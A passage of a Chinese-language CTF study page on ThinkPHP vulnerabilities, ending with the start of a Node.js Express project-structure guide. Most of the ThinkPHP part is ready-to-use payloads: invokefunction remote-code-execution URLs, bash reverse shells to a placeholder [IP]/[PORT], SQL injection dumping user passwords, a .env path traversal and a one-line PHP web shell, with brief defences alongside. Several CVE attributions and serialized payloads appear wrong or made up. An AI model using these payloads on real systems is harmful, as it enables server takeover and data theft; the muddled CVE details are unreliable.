href="#受影响版本：" class="headerlink" title="受影响版本："></a>受影响版本：</h5><ul><li>ThinkPHP 5.0.23 及其之前版本</li><li>ThinkPHP 5.1.31 及其之前版本</li></ul><p><strong>防御措施</strong>：</p><ul><li>更新至最新的安全版本，及时修补已知漏洞。</li><li>对所有用户输入进行严格过滤，特别是与函数调用相关的输入。</li><li>禁止通过 URL 直接调用敏感的 PHP 函数，如 <code>eval</code>、<code>system</code>。</li></ul><h4 id="4-反序列化漏洞"><a href="#4-反序列化漏洞" class="headerlink" title="4 .反序列化漏洞"></a>4 .反序列化漏洞</h4><p>反序列化漏洞通常出现在使用序列化机制存储或传递数据的场景中。如果用户提供的数据未经验证就被反序列化，攻击者可以构造恶意的序列化数据，实现任意代码执行。</p><p><strong>漏洞示例</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 不安全的反序列化操作</span><br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>攻击者可以传递恶意的序列化数据：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;exec&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;phpinfo()&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>通过该漏洞，攻击者可以利用反序列化后的对象实现代码执行。</p><p><strong>防御措施</strong>：</p><ul><li>避免直接反序列化不可信的数据。</li><li>使用安全的序列化和反序列化方法，如 JSON 编码和解码。</li><li>如果必须使用 PHP 的反序列化机制，建议对输入数据进行严格校验。</li></ul><hr><h3 id="ThinkPHP-漏洞利用方法"><a href="#ThinkPHP-漏洞利用方法" class="headerlink" title="ThinkPHP 漏洞利用方法"></a>ThinkPHP 漏洞利用方法</h3><p>在 CTF 比赛中，ThinkPHP 相关题目通常会包含 SQL 注入、路径遍历、反序列化和 RCE 漏洞。以下是几种常见的漏洞利用方式：</p><h4 id="1-SQL-注入攻击"><a href="#1-SQL-注入攻击" class="headerlink" title="1. SQL 注入攻击"></a>1. SQL 注入攻击</h4><p>通过在 URL 或表单中注入恶意的 SQL 语句，攻击者可以操控查询结果。</p><ul><li>示例攻击 URL：<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">index</span>.php?id=<span class="hljs-number">1</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> username, <span class="hljs-keyword">password</span> <span class="hljs-keyword">FROM</span> users<br></code></pre></td></tr></table></figure></li></ul><p>此时，攻击者可以获得数据库中用户的用户名和密码。</p><h4 id="2-远程代码执行攻击"><a href="#2-远程代码执行攻击" class="headerlink" title="2. 远程代码执行攻击"></a>2. 远程代码执行攻击</h4><p>针对 ThinkPHP 5.x 中的 RCE 漏洞，可以构造如下 URL 来执行系统命令：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">index.php?s=index/\think\app/invokefunction&amp;<span class="hljs-function"><span class="hljs-keyword">function</span>=<span class="hljs-title">call_user_func_array</span>&amp;<span class="hljs-title">vars</span>[0]=<span class="hljs-title">system</span>&amp;<span class="hljs-title">vars</span>[1][]=<span class="hljs-title">id</span></span><br></code></pre></td></tr></table></figure><p>可以将 <code>system</code> 替换为其他函数，如 <code>exec</code>、<code>shell_exec</code> 等，执行不同的命令。</p><h4 id="3-路径遍历攻击"><a href="#3-路径遍历攻击" class="headerlink" title="3.路径遍历攻击"></a>3.路径遍历攻击</h4><p>攻击者通过路径遍历漏洞，获取系统中的敏感文件或配置文件。例如，访问 <code>.env</code> 文件：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">index.php?s=..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>config/.env<br></code></pre></td></tr></table></figure><p>这种攻击可能泄露数据库连接信息，进一步导致更严重的后果。</p><h4 id="4-反序列化攻击"><a href="#4-反序列化攻击" class="headerlink" title="4. 反序列化攻击"></a>4. 反序列化攻击</h4><p>攻击者可以构造恶意的序列化数据，利用反序列化漏洞进行攻击。可以通过发送特定的 POST 请求来传递恶意的对象数据，并实现代码执行。</p><hr><h3 id="ThinkPHP-安全防御措施"><a href="#ThinkPHP-安全防御措施" class="headerlink" title="ThinkPHP 安全防御措施"></a>ThinkPHP 安全防御措施</h3><p>为防止 ThinkPHP 应用程序被攻击，可以采取以下防御措施：</p><ol><li><p><strong>及时更新框架</strong>：保持 ThinkPHP 框架的最新版本，修补已知漏洞。尤其是存在远程代码执行漏洞的 ThinkPHP 5.x 系列，建议及时更新至最新版本。</p></li><li><p><strong>输入过滤</strong>：对所有用户输入进行严格的过滤和校验，尤其是 URL 参数和 POST 数据，防止注入和路径遍历攻击。</p></li><li><p><strong>使用 ORM 或参数化查询</strong>：避免直接拼接 SQL 查询，使用框架的 ORM 或者 PDO 提供的参数化查询功能，防止 SQL 注入。</p></li><li><p><strong>关闭调试模式</strong>：生产环境中应关闭调试模式，防止暴露敏感的调试信息。可以通过修改配置文件中的 <code>APP_DEBUG</code> 设置关闭调试。</p></li><li><p><strong>使用 Web 应用防火墙（WAF）</strong>：在服务器前端部署 WAF，防止常见的 Web 攻击，如 SQL 注入、XSS 和 RCE 等。</p></li><li><p><strong>路径安全</strong>：对于文件路径操作，使用 <code>realpath()</code> 或者其他方法确保路径合法，避免路径遍历攻击。</p></li><li><p><strong>反序列化防御</strong>：尽量避免反序列化用户提供的数据。如果必须使用反序列化，确保对数据进行严格校验，并限制可以被序列化的类。</p></li></ol><hr><h3 id="版本历史与漏洞总结"><a href="#版本历史与漏洞总结" class="headerlink" title="版本历史与漏洞总结"></a>版本历史与漏洞总结</h3><p><strong>ThinkPHP 5.x 漏洞历史</strong>：</p><ul><li><strong>CVE-2018-20062</strong>：该漏洞允许通过 URL 调用任意函数，导致远程代码执行。</li><li><strong>CVE-2019-9082</strong>：此漏洞存在于 ThinkPHP 5.x 系列，通过路径构造可以实现远程代码执行。</li></ul><p><strong>ThinkPHP 3.x 漏洞历史</strong>：</p><ul><li><strong>路径遍历漏洞</strong>：攻击</li></ul><p>者可以通过不安全的路径输入读取系统敏感文件。</p><ul><li><strong>反序列化漏洞</strong>：未安全处理反序列化数据，可能导致远程代码执行。</li></ul><hr><h3 id="CTF-题目中的-ThinkPHP-漏洞总结"><a href="#CTF-题目中的-ThinkPHP-漏洞总结" class="headerlink" title="CTF 题目中的 ThinkPHP 漏洞总结"></a>CTF 题目中的 ThinkPHP 漏洞总结</h3><p>在 CTF 中，常见的 ThinkPHP 相关题目漏洞有以下几类：</p><ol><li><strong>SQL 注入</strong>：利用不安全的 SQL 查询进行注入操作。</li><li><strong>远程代码执行</strong>：通过构造特殊的 URL 或输入执行系统命令。</li><li><strong>路径遍历</strong>：通过不当的文件路径处理读取服务器上的敏感文件。</li><li><strong>反序列化漏洞</strong>：利用反序列化机制实现任意代码执行。</li></ol><p>掌握这些攻击技巧和防御措施，可以帮助 CTF 选手在比赛中快速识别并利用 ThinkPHP 漏洞。</p><hr><h2 id="1-CVE-2018-20062-ThinkPHP-远程代码执行漏洞"><a href="#1-CVE-2018-20062-ThinkPHP-远程代码执行漏洞" class="headerlink" title="1. CVE-2018-20062 - ThinkPHP 远程代码执行漏洞"></a>1. <strong>CVE-2018-20062</strong> - ThinkPHP 远程代码执行漏洞</h2><h3 id="背景："><a href="#背景：" class="headerlink" title="背景："></a>背景：</h3><p><strong>CVE-2018-20062</strong> 是 ThinkPHP 5.x 系列中一个远程代码执行漏洞。该漏洞利用了框架中对 URL 参数的处理不当，允许攻击者通过构造恶意的 URL 调用 PHP 内置函数，最终实现代码执行。</p><h3 id="受影响版本：-1"><a href="#受影响版本：-1" class="headerlink" title="受影响版本："></a>受影响版本：</h3><ul><li>ThinkPHP 5.0.23 及其之前版本</li><li>ThinkPHP 5.1.31 及其之前版本</li></ul><h3 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h3><p>ThinkPHP 在路由处理时，允许 URL 中的函数和参数直接调用系统函数，导致攻击者可以通过构造恶意的 URL 来调用任意函数并执行系统命令。</p><h3 id="漏洞利用的-URL-格式："><a href="#漏洞利用的-URL-格式：" class="headerlink" title="漏洞利用的 URL 格式："></a>漏洞利用的 URL 格式：</h3><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab">index.php?s=index/\think\app/invokefunction&amp;<span class="hljs-function"><span class="hljs-keyword">function</span>=<span class="hljs-title">call_user_func_array</span>&amp;<span class="hljs-title">vars</span><span class="hljs-params">[0]</span>=<span class="hljs-params">[函数名]</span>&amp;<span class="hljs-title">vars</span><span class="hljs-params">[1]</span><span class="hljs-params">[]</span>=参数1&amp;<span class="hljs-title">vars</span><span class="hljs-params">[1]</span><span class="hljs-params">[]</span>=参数2...</span><br></code></pre></td></tr></table></figure><h3 id="利用-Payload-示例："><a href="#利用-Payload-示例：" class="headerlink" title="利用 Payload 示例："></a>利用 Payload 示例：</h3><h4 id="执行-phpinfo-函数："><a href="#执行-phpinfo-函数：" class="headerlink" title="执行 phpinfo() 函数："></a>执行 <code>phpinfo()</code> 函数：</h4><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas"><span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\app/invokefunction<span class="hljs-variable">&amp;function</span>=call_user_func_array<span class="hljs-variable">&amp;vars</span>[0]=phpinfo<br></code></pre></td></tr></table></figure><h4 id="执行系统命令-whoami："><a href="#执行系统命令-whoami：" class="headerlink" title="执行系统命令 whoami："></a>执行系统命令 <code>whoami</code>：</h4><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas"><span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\app/invokefunction<span class="hljs-variable">&amp;function</span>=call_user_func_array<span class="hljs-variable">&amp;vars</span>[0]=system<span class="hljs-variable">&amp;vars</span>[1][]=whoami<br></code></pre></td></tr></table></figure><h4 id="执行-id-命令获取用户权限："><a href="#执行-id-命令获取用户权限：" class="headerlink" title="执行 id 命令获取用户权限："></a>执行 <code>id</code> 命令获取用户权限：</h4><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas"><span class="hljs-keyword">index</span>.php?s=<span class="hljs-keyword">index</span>/\think\app/invokefunction<span class="hljs-variable">&amp;function</span>=call_user_func_array<span class="hljs-variable">&amp;vars</span>[0]=system<span class="hljs-variable">&amp;vars</span>[1][]=id<br></code></pre></td></tr></table></figure><h4 id="执行反向-Shell-命令："><a href="#执行反向-Shell-命令：" class="headerlink" title="执行反向 Shell 命令："></a>执行反向 Shell 命令：</h4><p>如果服务器允许外部网络访问，可以使用以下 Payload 触发反向 Shell：</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab">index.php?s=index/\think\app/invokefunction&amp;<span class="hljs-function"><span class="hljs-keyword">function</span>=<span class="hljs-title">call_user_func_array</span>&amp;<span class="hljs-title">vars</span><span class="hljs-params">[0]</span>=<span class="hljs-title">system</span>&amp;<span class="hljs-title">vars</span><span class="hljs-params">[1]</span><span class="hljs-params">[]</span>=<span class="hljs-title">bash</span>+-<span class="hljs-title">c</span>+&#x27;<span class="hljs-title">bash</span>+-<span class="hljs-title">i</span>+&gt;&amp;+/<span class="hljs-title">dev</span>/<span class="hljs-title">tcp</span>/<span class="hljs-params">[IP]</span>/<span class="hljs-params">[PORT]</span>+0&gt;&amp;1&#x27;</span><br></code></pre></td></tr></table></figure><hr><h2 id="2-CVE-2019-9082-ThinkPHP-远程代码执行漏洞"><a href="#2-CVE-2019-9082-ThinkPHP-远程代码执行漏洞" class="headerlink" title="2. CVE-2019-9082 - ThinkPHP 远程代码执行漏洞"></a>2. <strong>CVE-2019-9082</strong> - ThinkPHP 远程代码执行漏洞</h2><h3 id="背景：-1"><a href="#背景：-1" class="headerlink" title="背景："></a>背景：</h3><p><strong>CVE-2019-9082</strong> 是 ThinkPHP 5.x 中另一个远程代码执行漏洞。此漏洞发生在处理 URL 时，攻击者可以构造恶意的 URL 通过框架执行任意的系统命令。</p><h3 id="受影响版本：-2"><a href="#受影响版本：-2" class="headerlink" title="受影响版本："></a>受影响版本：</h3><ul><li>ThinkPHP 5.0.23 及其之前版本</li><li>ThinkPHP 5.1.31 及其之前版本</li></ul><h3 id="漏洞原理：-1"><a href="#漏洞原理：-1" class="headerlink" title="漏洞原理："></a>漏洞原理：</h3><p>类似于 <strong>CVE-2018-20062</strong>，该漏洞允许攻击者在 URL 中调用 PHP 内置函数，最终实现代码执行。</p><h3 id="利用-Payload-示例：-1"><a href="#利用-Payload-示例：-1" class="headerlink" title="利用 Payload 示例："></a>利用 Payload 示例：</h3><h4 id="执行-phpinfo-函数：-1"><a href="#执行-phpinfo-函数：-1" class="headerlink" title="执行 phpinfo() 函数："></a>执行 <code>phpinfo()</code> 函数：</h4><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi"><span class="hljs-keyword">index</span>.php?s=/home/<span class="hljs-keyword">index</span>/<span class="hljs-keyword">index</span>/<span class="hljs-keyword">name</span>/<span class="hljs-comment">&#123;@phpinfo()&#125;</span><br></code></pre></td></tr></table></figure><h4 id="执行系统命令-whoami：-1"><a href="#执行系统命令-whoami：-1" class="headerlink" title="执行系统命令 whoami："></a>执行系统命令 <code>whoami</code>：</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">index</span>.php?s=/home/<span class="hljs-keyword">index</span>/<span class="hljs-keyword">index</span>/<span class="hljs-type">name</span>/&#123;@<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>)&#125;<br></code></pre></td></tr></table></figure><h4 id="获取文件列表（执行-ls-命令）："><a href="#获取文件列表（执行-ls-命令）：" class="headerlink" title="获取文件列表（执行 ls 命令）："></a>获取文件列表（执行 <code>ls</code> 命令）：</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">bash<br>复制代码<br><span class="hljs-keyword">index</span>.php?s=/home/<span class="hljs-keyword">index</span>/<span class="hljs-keyword">index</span>/<span class="hljs-type">name</span>/&#123;@<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>)&#125;<br></code></pre></td></tr></table></figure><h4 id="执行反向-Shell："><a href="#执行反向-Shell：" class="headerlink" title="执行反向 Shell："></a>执行反向 Shell：</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">index</span>.php?s=/home/<span class="hljs-keyword">index</span>/<span class="hljs-keyword">index</span>/<span class="hljs-type">name</span>/&#123;@<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;bash -i &gt;&amp; /dev/tcp/[IP]/[PORT] 0&gt;&amp;1&#x27;</span>)&#125;<br></code></pre></td></tr></table></figure><hr><h2 id="3-CVE-2018-19518-ThinkPHP-反序列化远程代码执行漏洞"><a href="#3-CVE-2018-19518-ThinkPHP-反序列化远程代码执行漏洞" class="headerlink" title="3. CVE-2018-19518 - ThinkPHP 反序列化远程代码执行漏洞"></a>3. <strong>CVE-2018-19518</strong> - ThinkPHP 反序列化远程代码执行漏洞</h2><h3 id="背景：-2"><a href="#背景：-2" class="headerlink" title="背景："></a>背景：</h3><p>该漏洞是 ThinkPHP 5.x 系列中的一个反序列化漏洞。攻击者可以通过精心构造的反序列化数据传递恶意对象，导致远程代码执行。</p><h3 id="受影响版本：-3"><a href="#受影响版本：-3" class="headerlink" title="受影响版本："></a>受影响版本：</h3><ul><li>ThinkPHP 5.x 系列</li></ul><h3 id="漏洞原理：-2"><a href="#漏洞原理：-2" class="headerlink" title="漏洞原理："></a>漏洞原理：</h3><p>PHP 中的序列化与反序列化操作如果处理不当，会导致攻击者通过构造恶意序列化数据进行对象注入。ThinkPHP 在某些功能中使用了不安全的反序列化操作，导致可以利用恶意序列化对象实现代码执行。</p><h3 id="利用-Payload-示例：-2"><a href="#利用-Payload-示例：-2" class="headerlink" title="利用 Payload 示例："></a>利用 Payload 示例：</h3><h4 id="恶意序列化数据："><a href="#恶意序列化数据：" class="headerlink" title="恶意序列化数据："></a>恶意序列化数据：</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;ThinkPHP&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;exec&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;phpinfo()&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>该序列化对象中的 <code>exec</code> 字段会被执行，从而调用 <code>phpinfo()</code> 函数。</p><h4 id="执行系统命令-whoami：-2"><a href="#执行系统命令-whoami：-2" class="headerlink" title="执行系统命令 whoami："></a>执行系统命令 <code>whoami</code>：</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;ThinkPHP&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;exec&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;whoami&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><hr><h2 id="4-CVE-2018-1000861-ThinkPHP-模板注入漏洞"><a href="#4-CVE-2018-1000861-ThinkPHP-模板注入漏洞" class="headerlink" title="4. CVE-2018-1000861 - ThinkPHP 模板注入漏洞"></a>4. <strong>CVE-2018-1000861</strong> - ThinkPHP 模板注入漏洞</h2><h3 id="背景：-3"><a href="#背景：-3" class="headerlink" title="背景："></a>背景：</h3><p>模板注入漏洞允许攻击者通过不当的输入插入并执行任意的 PHP 代码。此漏洞发生在开发者未正确过滤用户输入的情况下，导致攻击者可以通过模板引擎执行恶意代码。</p><h3 id="受影响版本：-4"><a href="#受影响版本：-4" class="headerlink" title="受影响版本："></a>受影响版本：</h3><ul><li>ThinkPHP 3.x 和 5.x 系列</li></ul><h3 id="利用-Payload-示例：-3"><a href="#利用-Payload-示例：-3" class="headerlink" title="利用 Payload 示例："></a>利用 Payload 示例：</h3><h4 id="通过模板注入执行-phpinfo-："><a href="#通过模板注入执行-phpinfo-：" class="headerlink" title="通过模板注入执行 phpinfo()："></a>通过模板注入执行 <code>phpinfo()</code>：</h4><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi"><span class="hljs-keyword">index</span>.php?s=/home/<span class="hljs-keyword">index</span>/<span class="hljs-keyword">index</span>/<span class="hljs-keyword">name</span>/<span class="hljs-comment">&#123;@phpinfo()&#125;</span><br></code></pre></td></tr></table></figure><h4 id="通过模板注入执行系统命令-whoami："><a href="#通过模板注入执行系统命令-whoami：" class="headerlink" title="通过模板注入执行系统命令 whoami："></a>通过模板注入执行系统命令 <code>whoami</code>：</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">index</span>.php?s=/home/<span class="hljs-keyword">index</span>/<span class="hljs-keyword">index</span>/<span class="hljs-type">name</span>/&#123;@<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>)&#125;<br></code></pre></td></tr></table></figure><h4 id="获取文件列表（执行-ls-命令）：-1"><a href="#获取文件列表（执行-ls-命令）：-1" class="headerlink" title="获取文件列表（执行 ls 命令）："></a>获取文件列表（执行 <code>ls</code> 命令）：</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">index</span>.php?s=/home/<span class="hljs-keyword">index</span>/<span class="hljs-keyword">index</span>/<span class="hljs-type">name</span>/&#123;@<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>)&#125;<br></code></pre></td></tr></table></figure><hr><h2 id="5-CVE-2019-8018-ThinkPHP-SQL-注入漏洞"><a href="#5-CVE-2019-8018-ThinkPHP-SQL-注入漏洞" class="headerlink" title="5. CVE-2019-8018 - ThinkPHP SQL 注入漏洞"></a>5. <strong>CVE-2019-8018</strong> - ThinkPHP SQL 注入漏洞</h2><h3 id="背景：-4"><a href="#背景：-4" class="headerlink" title="背景："></a>背景：</h3><p>此漏洞存在于 ThinkPHP 中的 SQL 查询处理部分，攻击者可以通过注入恶意的 SQL 查询操控数据库。在某些场景下，未正确过滤或使用不安全的查询方式，导致攻击者通过拼接 SQL 语句进行注入。</p><h3 id="受影响版本：-5"><a href="#受影响版本：-5" class="headerlink" title="受影响版本："></a>受影响版本：</h3><ul><li>ThinkPHP 3.x 系列</li></ul><h3 id="利用-Payload-示例：-4"><a href="#利用-Payload-示例：-4" class="headerlink" title="利用 Payload 示例："></a>利用 Payload 示例：</h3><h4 id="获取数据库所有用户信息："><a href="#获取数据库所有用户信息：" class="headerlink" title="获取数据库所有用户信息："></a>获取数据库所有用户信息：</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">index.php?<span class="hljs-attribute">id</span>=1&#x27; UNION SELECT username, password <span class="hljs-keyword">FROM</span><span class="hljs-built_in"> users </span>--<br></code></pre></td></tr></table></figure><h4 id="利用-UNION-SELECT-获取数据库版本："><a href="#利用-UNION-SELECT-获取数据库版本：" class="headerlink" title="利用 UNION SELECT 获取数据库版本："></a>利用 <code>UNION SELECT</code> 获取数据库版本：</h4><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">index.php?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27; UNION SELECT <span class="hljs-built_in">version</span>(), <span class="hljs-number">1</span> <span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><h4 id="查询所有表名："><a href="#查询所有表名：" class="headerlink" title="查询所有表名："></a>查询所有表名：</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">index.php?<span class="hljs-attribute">id</span>=1&#x27; UNION SELECT table_name <span class="hljs-keyword">FROM</span> information_schema.tables WHERE <span class="hljs-attribute">table_schema</span>=database() --<br></code></pre></td></tr></table></figure><h4 id="获取指定表的字段名："><a href="#获取指定表的字段名：" class="headerlink" title="获取指定表的字段名："></a>获取指定表的字段名：</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">index.php?<span class="hljs-attribute">id</span>=1&#x27; UNION SELECT column_name <span class="hljs-keyword">FROM</span> information_schema.columns WHERE <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span> --<br></code></pre></td></tr></table></figure><hr><h2 id="6-CVE-2019-7481-ThinkPHP-后台文件上传漏洞"><a href="#6-CVE-2019-7481-ThinkPHP-后台文件上传漏洞" class="headerlink" title="6. CVE-2019-7481 - ThinkPHP 后台文件上传漏洞"></a>6. <strong>CVE-2019-7481</strong> - ThinkPHP 后台文件上传漏洞</h2><h3 id="背景：-5"><a href="#背景：-5" class="headerlink" title="背景："></a>背景：</h3><p>此漏洞涉及到 ThinkPHP 文件上传功能的处理不当。攻击者可以上传恶意的 PHP 文件，绕过文件类型检查，直接在服务器上执行任意 PHP 代码。</p><h3 id="受影响版本：-6"><a href="#受影响版本：-6" class="headerlink" title="受影响版本："></a>受影响版本：</h3><ul><li>ThinkPHP 5.x 系列</li></ul><h3 id="漏洞原理：-3"><a href="#漏洞原理：-3" class="headerlink" title="漏洞原理："></a>漏洞原理：</h3><p>文件上传功能未能正确校验上传文件的后缀名或 MIME 类型，允许攻击者上传恶意 PHP 文件并直接访问该文件。</p><h3 id="利用步骤："><a href="#利用步骤：" class="headerlink" title="利用步骤："></a>利用步骤：</h3><ol><li>上传包含 PHP 代码的 WebShell，如：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><ol><li>访问上传的 PHP 文件并执行命令：</li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>example.com<span class="hljs-regexp">/uploads/</span>shell.php?cmd=whoami<br></code></pre></td></tr></table></figure><h1 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a>Node.js</h1><h2 id="目录-3"><a href="#目录-3" class="headerlink" title="目录"></a>目录</h2><h2 id="Node-js-项目的基本结构"><a href="#Node-js-项目的基本结构" class="headerlink" title="Node.js 项目的基本结构"></a><strong>Node.js 项目的基本结构</strong></h2><p>这是一个典型的 <strong>Express 项目</strong>的目录结构，适合初学者理解：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash复制代码/project-root<br>│<br>├── /node_modules         <span class="hljs-comment"># 依赖模块（通过 npm 自动管理）</span><br>│<br>├── /public               <span class="hljs-comment"># 静态资源（HTML、CSS、JS、图片等）</span><br>│   ├── index.html<br>│   ├── styles.css<br>│   └── script.js<br>│<br>├── /routes               <span class="hljs-comment"># 路由定义</span><br>│   ├── index.js          <span class="hljs-comment"># 首页路由</span><br>│   ├── users.js          <span class="hljs-comment"># 用户相关路由</span><br>│<br>├── /controllers          <span class="hljs-comment"># 控制器逻辑</span><br>│   └── userController.js <span class="hljs-comment"># 用户业务逻辑处理</span><br>│<br>├── /models               <span class="hljs-comment"># 数据模型</span><br>│   └── userModel.js      <span class="hljs-comment"># 用户数据模型（MongoDB / MySQL）</span><br>│<br>├── /views                <span class="hljs-comment"># 模板文件目录（EJS / Pug 等模板引擎）</span><br>│   └── index.ejs         <span class="hljs-comment"># 首页模板</span><br>│<br>├── .<span class="hljs-built_in">env</span>                  <span class="hljs-comment"># 环境变量配置文件</span><br>├── package.json          <span class="hljs-comment"># 项目依赖描述文件</span><br>├── package-lock.json     <span class="hljs-comment"># 依赖版本锁定文件</span><br>├── app.js                <span class="hljs-comment"># Express 应用主入口</span><br>└── README.md             <span class="hljs-comment"># 项目文档</span><br></code></pre></td></tr></table></figure><hr><h3 id="目录与文件说明"><a href="#目录与文件说明" class="headerlink" title="目录与文件说明"></a><strong>目录与文件说明</strong></h3><ol><li>**<code>/node_modules/</code>**：<ul><li>通过 <strong>npm</strong> 安装的所有依赖包都会放在这里。</li><li><strong>无需手动编辑</strong>，会自动生成。</li></ul></li><li>**<code>/public/</code>**：<ul><li>存放<strong>静态资源文件</strong>，如 HTML 页面、CSS 文件、JavaScript 文件、图片等。</li><li>这些资源可以直接对外暴露，供客户端访问。</li></ul></li><li>**<code>/routes/</code>**：<ul><li>定义不同路径的 <strong>路由</strong>（例如 <code>/</code> 或 <code>/users</code>）。</li><li>每个路由文件会导出一个路由模块，供主程序 <code>app.js</code> 使用。</li></ul></li><li>**<code>/controllers/</code>**：<ul><li>存放<strong>业务逻辑控制器</strong>，负责处理用户的请求，并返回响应。</li><li>控制器会调用模型层与数据库交互，并将结果返回给路由层。</li></ul></li><li>**<code>/models/</code>**：<ul><li>定义数据库的 <strong>数据模型</strong>。如果使用 MongoDB，则会定义 Mongoose 模型；如果使用 MySQL，则会定义 ORM 模型。</li></ul></li><li>**<code>/views/</code>**：<ul><li>存放 <strong>模板文件</strong>，如 EJS、Pug、Handlebars 等，用于动态渲染 HTML。</li></ul></li><li>**<code>app.js</code>**：<ul><li><strong>Node.js 应用的主入口</strong>文件。它初始化 Express 